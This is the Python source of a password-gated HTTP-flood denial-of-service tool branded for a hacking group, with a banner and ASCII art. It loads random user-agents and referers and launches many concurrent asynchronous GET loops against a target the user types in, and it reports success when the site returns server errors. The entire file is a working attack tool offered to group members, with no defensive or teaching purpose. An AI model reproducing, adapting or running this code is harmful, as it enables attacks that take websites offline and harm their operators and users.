import aiohttp
import asyncio
import os
import getpass
import time
import sys
import random


headers_useragents = []
headers_referers = []
R = '\033[31m' #Aggressive/Alert/Caution/Warning/Failed
B = '\033[34m' #Normal/Questioning/
G = '\033[1;32m' #Process Completed/Success/
Y = '\033[32m' #On Process/Processing/Executing/Deploying/

def dict_headers():
    global headers_useragents
    with open("useragents.txt", "r") as uf:
        useragents = uf.read().splitlines()
        for useragent in useragents:
            headers_useragents.append(useragent)

def dict_referers():
    global headers_referers
    with open("referers.txt", "r") as rf:
        referers = rf.read().splitlines()
        for referer in referers:
            headers_referers.append(referer)

dict_headers()
dict_referers()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def intro():
    clear()
    message = f"""{B}

C R E A T E D   B Y   3 x p 0 5 3.....


E O T C W   D D o S   t o o l   m a d e   f o r   E O T C W / V U L N S E C   m e m b e r s   o n l y!!!
N E V E R   S H A R E   T H I S   W I T H   O T H E R   O R G S   O R   T O   A N Y   O F   Y O U R
F R I E N D S   I N   C W   O R   R E A L   W O R L D....

Greetz: ALL EOTCW MEMBERS....

    """
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)
    time.sleep(2)

clear()

intro()

clear()

print(f"""{B}

                         ........ ..
                  ......l.,;;'c'..c..c..'.
              ..'';;l.....           '.;'c;,..
            .,'.,;..                     .'.'c'.
          .;,,:'.         ......            ..,.''
        .,',;'.     ..':;::cllooc;,....        .,:..
       ''::..   ..,;clxO0KXXK0Oxllclc;,.         .,,..
     .,;''..  ..,cdOXWWWWNNXKOxl:;;;;;,..         ..c;.
     '::;.   .,lkKWWWNXK0kxoc:,... ...              .;,.
    .;:,.   .cd0XK0kdc;'.                            ';'
   .:;'.  ..:loool;..     .clc'                       ,,,
   .','.  .,;,'..    .....dXWNk  .                    .',.
  .....   .'.     .,oxxll.lc,:'   .                   .....
  .....   .      ,ONNNWOx,l,     .c'.  .       ..     .....
  .....   ..'.  .kMWWWWO;::d'.  .ok'. ,,'.'..,;lc'    ...'.
   ...    ..',,ld0NWNWWWd;okxdlloko..;::,.'.;dOOkl.   .'''.
           .':c:;lx0NWWMWO:';:od''  ,c;,.'';lkKKO:.   '',,.
     ..     .;llc,'.cdk0XNNx;.''..';:;,,....;oo:.    .'',,
     .'     .;cokxolc;;:,cclddolc:,,..     'cl'.    .';,,.
      ..     .;oOKK0xdl:;,'.......       ..,,.      ';;,'
       '.      'cx0K0Oxdoc:,'...       .....       ';;,'
        '.       .:codxkkddol;,....... .         .';;,'
         ..        ..'::ccccc:,'.....           .,;;,.
          ...         ......''...             .',;,.
            ....                           ..';,,'.
               ....                     ..',;'''.
                  ......            ....',';..
                      ............'.....

{R}DDOS TOOLS OF EOTCW AND VULNSEC ARMY PH [HTTP-FLOOD METHOD V.1]
WE HATE EVIL,WICKEDNESS,ABOMINATION,AND CRUELTY; WE HACK FOR GOD!
[!] WARNING: ONLY USE THIS TOOL AGAINST EVIL AND NOT FOR EVIL!!!
PRESS CTRL + C TO EXIT

""")

password = "Kupal si UnK"

async def attack(target):
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                headers = {'User-Agent': random.choice(headers_useragents),'referer': random.choice(headers_referers)}
                async with session.get(target, headers=headers) as response:
                    if response.status >= 500:
                        print(f"{G}[+] Target Website is down! DDoS attack successful!")
                    elif response.status == 403:
                        print(f"{R}[!] DDoS attack bloked!!!")
                    elif response.status >= 200 and response.status < 500:
                        print(f"{Y}[*] Attacking {target}, Sending {requests} Request.")
                    else:
                        print(f"{R}Unexpected status code: {response.status}")

    except aiohttp.ClientError as e:
        print(f"{R}Client error: {e}")
    except asyncio.TimeoutError:
        print(f"{R}Request timed out")
    except Exception as e:
        print(f"{R}Unexpected error: {e}")
    except KeyboardInterrupt:
        alert = f"{R}Exiting....."
        for char in alert:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)
        time.sleep(1)
        exit()

async def main(target):
    await asyncio.gather(*[attack(target) for r in range(requests)])

if __name__ == "__main__":
    input_password = getpass.getpass(f"{B}Enter the password: ")
    if input_password == password:
        target = input(f"{B}Enter the target: ")
        requests = int(input(f"{B}Enter the amount requests: "))
        print(f"{Y}Starting the Attack....")
        asyncio.run(main(target))
    else:
        alert = f"{R}PASSWORD INVALID. ACCESS DENIED!!! "
        for char in alert:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)
        time.sleep(1)
        clear()
